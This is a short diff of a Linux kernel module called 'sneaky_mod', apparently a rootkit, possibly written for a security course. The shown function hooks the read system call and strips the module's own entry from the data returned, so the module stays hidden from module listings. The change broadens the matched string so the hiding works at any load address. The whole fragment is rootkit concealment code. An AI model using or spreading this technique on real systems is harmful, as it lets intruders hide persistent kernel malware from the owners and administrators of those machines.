@@ -95,7 +95,7 @@ asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   
   ssize_t value = (*original_read)(fd, buf, count); 
-  char* sn_pos = strstr(buf, "sneaky_mod 16384 0 - Live 0xffffffff");
+  char* sn_pos = strstr(buf, "sneaky_mod 16384 0 - Live 0x");
   if(sn_pos != NULL && sn_pos >= (char*)buf && sn_pos < (char*)buf + count)
   {
     char* line_pos = strchr(sn_pos, '\n');
